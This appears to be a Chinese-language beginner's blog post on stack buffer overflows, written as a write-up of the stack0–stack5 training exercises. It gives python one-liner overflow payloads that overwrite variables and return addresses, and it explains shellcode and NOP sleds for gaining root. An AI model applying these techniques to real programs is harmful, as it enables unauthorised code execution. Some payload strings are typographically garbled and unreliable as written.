@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html class="full-height">
+<head>
+  <meta charset="utf-8">
+  <link rel="stylesheet" href="//cdn.bootcss.com/bulma/0.4.1/css/bulma.min.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+  
+  <title>初学PWN---栈溢出 | Snow&#39;s BLOG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="经过百转千回弯弯绕绕我这个可爱的程序媛最终还是屈服在PWN的淫威下，接下来的内容是我PWN入门的一些知识，如果有什么知识性的错误，请大方指出来，给你奖励小发发❀ 首先，在学PWN之前我学了C语言和汇编语言，还了解一点python和Linux系统的基本操作，并且也有一点点逆向工程 的基础，学PWN主要是看YouTube上面一个声音巨好听的美国不露面小哥哥的视频，这个小哥哥三年前也是一边自学PWN一边">
+<meta name="keywords" content="PWN">
+<meta property="og:type" content="article">
+<meta property="og:title" content="初学PWN---栈溢出">
+<meta property="og:url" content="http://snow146.github.io/2018/10/12/初学pwn之栈溢出/index.html">
+<meta property="og:site_name" content="Snow&#39;s BLOG">
+<meta property="og:description" content="经过百转千回弯弯绕绕我这个可爱的程序媛最终还是屈服在PWN的淫威下，接下来的内容是我PWN入门的一些知识，如果有什么知识性的错误，请大方指出来，给你奖励小发发❀ 首先，在学PWN之前我学了C语言和汇编语言，还了解一点python和Linux系统的基本操作，并且也有一点点逆向工程 的基础，学PWN主要是看YouTube上面一个声音巨好听的美国不露面小哥哥的视频，这个小哥哥三年前也是一边自学PWN一边">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-10-30T13:39:03.639Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="初学PWN---栈溢出">
+<meta name="twitter:description" content="经过百转千回弯弯绕绕我这个可爱的程序媛最终还是屈服在PWN的淫威下，接下来的内容是我PWN入门的一些知识，如果有什么知识性的错误，请大方指出来，给你奖励小发发❀ 首先，在学PWN之前我学了C语言和汇编语言，还了解一点python和Linux系统的基本操作，并且也有一点点逆向工程 的基础，学PWN主要是看YouTube上面一个声音巨好听的美国不露面小哥哥的视频，这个小哥哥三年前也是一边自学PWN一边">
+  
+    <link rel="alternate" href="/atom.xml" title="Snow&#39;s BLOG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/common.css">
+<link rel="stylesheet" href="/css/nav.css">
+<link rel="stylesheet" href="/css/layout.css">
+  
+
+</head>
+
+<body>
+  <header id="navbar" class="overflow-hidden">
+  <div class="container">
+    <nav class="nav">
+         <div class="nav-left">
+            <a href="/" class="nav-item" style="font-size: 20px;">
+              <span class="logo">snow146</span>'s Blog
+            </a>
+         </div>
+        <div class="nav-center is-hidden position-relative" id="search_container">
+            <div class="nav-item full-width full-height">
+                <i class="fa fa-search has-padding" aria-hidden="true"></i>
+                <input type="text" id="search_input" class="search-input full-height full-width" placeholder="Search post" autofocus>
+                <i id="close_search" class="fa fa-times" aria-hidden="true"></i>
+            </div>
+            <div id="search_result"></div>
+        </div>
+        <div class="nav-right nav-menu">
+            <a class="nav-item" id="search">
+                <i class="fa fa-search" aria-hidden="true"></i>
+            </a>
+            
+            <a class="nav-item" href="/">
+                Home
+            </a>
+            
+            <a class="nav-item" href="/works">
+                My Works
+            </a>
+            
+            <a class="nav-item" href="/about">
+                About
+            </a>
+            
+        </div>
+        <span class="nav-toggle" id="navMenuDropdown">
+            <span></span>
+            <span></span>
+            <span></span>
+        </span>
+        <div class="navbar-menu position-absolute full-width content-box is-hidden-desktop is-flex flex-column center" style="top: 100%;">
+            
+            <a class="nav-item flex-1" href="/">
+                Home
+            </a>
+            
+            <a class="nav-item flex-1" href="/works">
+                My Works
+            </a>
+            
+            <a class="nav-item flex-1" href="/about">
+                About
+            </a>
+            
+        </div>
+    </nav>
+  </div>
+</header>
+
+  <div id="main-wrap" class="position-relative" style="margin-top: 55px;">
+      <div class="main-inner-content">
+          <!--博文页面-->
+
+<style>
+    .header-box {
+        height: 370px;
+        filter: blur(10px);
+        background-size: cover;
+        background-color: lightsteelblue;
+    }
+
+    .post-box {
+        padding: 15px;
+        padding-top: 60px;
+        min-height: 80vh;
+        margin-top: -200px;
+        border-radius: 4px;
+        background-color: rgba(255,255,255,.8);
+    }
+
+    .post-avatar {
+        height: 30px;
+        width: 30px;
+        border-radius: 50%;
+    }
+
+    .flow-chart {
+        text-align: center;
+    }
+
+    img[alt="post-cover"] {
+        display: none;
+    }
+</style>
+<header>
+    <div id="header_box" class="header-box"></div>
+</header>
+<section>
+    <div class="container post-box">
+        <div class="content post-title is-flex center flex-column" style="margin-bottom: 70px; overflow: auto;">
+            <h1 class="has-text-centered" style="padding-bottom: 10px; border-bottom: 3px solid #fff">
+                <strong>初学PWN---栈溢出</strong>
+            </h1>
+            
+            <div class="is-flex align-center">
+                <img class="post-avatar" src="https://cdn2.iconfinder.com/data/icons/rcons-user/32/male-shadow-circle-512.png">
+                <span style="padding:0 10px;"> <span class="sub-title">By</span> snow146</span>
+                <span class="post-date sub-title">at: 2018-10-12</span>
+            </div>
+            
+                <div>
+                    
+                         <a class="tag is-post-tag" href="/tags/PWN/">PWN</a>
+                    
+                </div>
+            
+        </div>
+        <div class="content" style="overflow: auto">
+            <p>经过百转千回弯弯绕绕我这个可爱的程序媛最终还是屈服在PWN的淫威下，接下来的内容是我PWN入门的一些知识，如果有什么知识性的错误，请大方指出来，给你奖励小发发❀</p>
+<p>首先，在学PWN之前我学了<strong>C语言</strong>和<strong>汇编语言</strong>，还了解一点<strong>python</strong>和<strong>Linux系统</strong>的基本操作，并且也有一点点<strong>逆向工程</strong> 的基础，学PWN主要是看<strong>YouTube</strong>上面一个声音巨好听的美国不露面小哥哥的视频，这个小哥哥三年前也是一边自学PWN一边录视频，讲的很基础好懂又幽默有趣，最近看到小哥哥去了拉斯维加斯参加<strong>defcon</strong> 和<strong>blackhat</strong>，而且那个小哥哥竟然还是个学生，无数次感觉输在了人生的起跑线上呢，我也才上大学，他在上大学就知道那么多知识，而我还只是个萌新呢，一起加油~~（暗戳戳的说一句，感觉那个小哥哥长得好高啊，对我来说高=帅）</p>
+<p>废话不多说，贴上视频地址<a href="http://liveoverflow.com/" title="liveoverflow" target="_blank" rel="noopener">http://liveoverflow.com/</a></p>
+<h2 id="stack0-4"><a href="#stack0-4" class="headerlink" title="stack0~4"></a>stack0~4</h2><p>这几个原理基本是差不多的，通过栈溢出将某值改变或者覆盖返回地址</p>
+<p>###0~2的答案和需要注意的地方###<br><strong>stack0</strong>主要讲的是覆盖掉modified的值让它不等于0即可，那我们首先找到buff的地址和modified的地址<br><code>0x080483fd &lt;main+9&gt;: movl $0x0,0x5c(%esp)</code>为modified的地址</p>
+<p>(<code>)
+0x08048405 &lt;main+17&gt;:   lea    0x1c(%esp),%eax
+0x08048409 &lt;main+21&gt;:   mov    %eax,(%esp)
+(</code>)是buff的地址<br>两个地址0x5c和0x1c相差0x40个字节再加上0X1个需要覆盖的字节</p>
+<ul>
+<li><p>代码如下：</p>
+<p>   $ python -c ‘print “A”*0x40+”\x01\x00\x00\x00”‘ | ./stack<br>   you have changed the ‘modified’ variable</p>
+</li>
+</ul>
+<p><strong>stack1</strong>让modified的地址等于0x61626364,思路同上题，不过要<strong>注意</strong>的是x86系列的电脑都是采用<strong>小端序</strong>的方式储存数据。</p>
+<ul>
+<li><p>小端序和大端序：</p>
+<blockquote>
+<p>小端序：字数据的低字节存储在低地址中。<br>大端序：字数据的高字节存储在低地址中。</p>
+</blockquote>
+</li>
+<li><p>代码如下：</p>
+<p>   ./stack1 $python -c ‘print “A”*0x40+”dcba”‘<br>   you have correctly got the variable to the right value</p>
+</li>
+</ul>
+<p><strong>stack2</strong>此处需要设置环境变量GREENIE</p>
+<ul>
+<li><p>代码如下：</p>
+<p>   $ GREENIE=`python -c ‘print “A”*0x40+”\x0a\x0d\x0a\x0d”‘<br>   $ export GREENIE<br>   $ ./stack2<br>   you have correctly modified the variable</p>
+</li>
+</ul>
+<p><strong>stack3</strong>此处我们需要跳到win函数处，首先获得win函数的地址:</p>
+<p><code>(gdb)print win</code>得到<code>$1 = {void (void)} 0x8048424 &lt;win&gt;</code><br>获得地址之后直接覆盖fp</p>
+<ul>
+<li><p>代码如下：</p>
+<p>   $python -c ‘print “A”*0x40+”\x24\x84\x04\08”‘ | ./stack3<br>   calling function pointer, jumping to 0x08048424<br>   code flow successfully changed        </p>
+</li>
+</ul>
+<p><strong>stack4</strong>覆盖返回地址让他跳到win函数就行了，注意这里要多覆盖0x1字节，偏移为0x4c</p>
+<ul>
+<li><p>代码如下：</p>
+<p>   $ python -c ‘print “A”*0x4C+”\xf4\x83\x04\x08”‘ | ./stack4<br>   code flow successfully changed<br>   Segmentation fault</p>
+<h2 id="stack5"><a href="#stack5" class="headerlink" title="stack5"></a>stack5</h2><p>首先介绍shellcode：Shellcode实际是一段代码（也可以是填充数据），是用来发送到服务器利用特定漏洞的代码，一般可以获取权限。另外，Shellcode一般是作为数据发送给受攻击服务器的</p>
+</li>
+</ul>
+<p>再介绍int 3（CC）：当被调试进程执行INT3指令导致一个异常时，调试器就会捕捉这个异常从而停在断点处，然后将断点处的指令恢复成原来的指令用INT3断点的好处是可以设置无数个断点，缺点是改变了原程序指令，容易被软件检测到。例如为了防范API被下断，一些软件会检测API的首地址是否为CCh，以此来判断是否被下了断点但是如果将断点下在函数的内部或者末尾，例如可以将断点下在函数入口的下一行，就可以躲过检测了<br>再来说说整个做题的想法，代码极其简单，但是我思考了很久为什么要这么做，暂时无果，按照视频所讲通过在缓存区放入shellcode通过管道传输给stack5，然后得到root权限</p>
+<p>Shellcode放在返回地址后面，前面跟上NOP Slot；这可以消除缓冲区位置的不确定性。 </p>
+<p>注意:非GDB运行和GDB运行，缓冲区的地址会有变化<br>注意：这里使用的”()”会生成一个子shell；</p>
+<p>子shell中执行两条命令。</p>
+<p>第一条命令将payload输出到标准输出，通过管道传输给stack5；</p>
+<p>第二个命令cat从标准输入中读取数据输出到标准输出，也会通过管道传输给stack5；<br><strong> builtin_ return_ address(0)的含义是，得到当前函数返回地址，即此函数被别的函数调用，然后此函数执行完毕后，返回，所谓返回地址就是那时候的地址。_builtin_return_address(1)的含义是，得到当前函数的调用者的返回地址。注意是调用者的返回地址，而不是函数起始地址。利用</strong>builtin_return_address来获得函数运行栈的方法。</p>
+
+        </div>
+        <div class="post-reply">
+            
+                <!-- 来必力City版安装代码 -->
+                <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTE4Ni81NzUz">
+                    <script type="text/javascript">
+                        (function(d, s) {
+                            var j, e = d.getElementsByTagName(s)[0];
+
+                            if (typeof LivereTower === 'function') { return; }
+
+                            j = d.createElement(s);
+                            j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                            j.async = true;
+
+                            e.parentNode.insertBefore(j, e);
+                        })(document, 'script');
+                    </script>
+                    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+                </div>
+                <!-- City版安装代码已完成 -->
+            
+            
+        </div>
+    </div>
+</section>
+<script>
+    // 获取第一张图, 用以当封面背景图
+    var img = document.querySelectorAll('img')[1]
+
+    if (img) {
+        var header_box = document.querySelector('#header_box')
+        header_box.style.backgroundImage = 'url('+ img.src +')'
+    }
+</script>
+
+<!-- for code block highlight --> 
+<!-- theme.block_highlight -->
+<!-- we do not guarantee the char sequences spell right, usr himself do it -->
+<link rel="stylesheet" href="/css/highlight_rainbow.css">
+<script src="/js/highlight.min.js"></script>
+<script type="text/javascript"> hljs.initHighlightingOnLoad();</script>
+
+      </div>
+  </div>
+  <style>
+  #footer {
+    min-height: 10vh;
+    background: black;
+    color: #fff;
+  }
+
+  #footer a {
+    color: #e1e1e1;
+  }
+</style>
+<footer id="footer" class="has-text-centered is-flex center">
+  <div class="container has-padding">
+    <div>
+      <div>
+        <!--请您保留作者署名, 主题制作来之不易-->
+        Theme by <a href="http://haojen.github.io/">Haojen Ma</a>
+        <br>
+        Copyright © Snow146 2018
+        <br>
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="/js/search_core.js"></script>
+<script src="/js/script.js"></script>
+
+</body>
+</html>
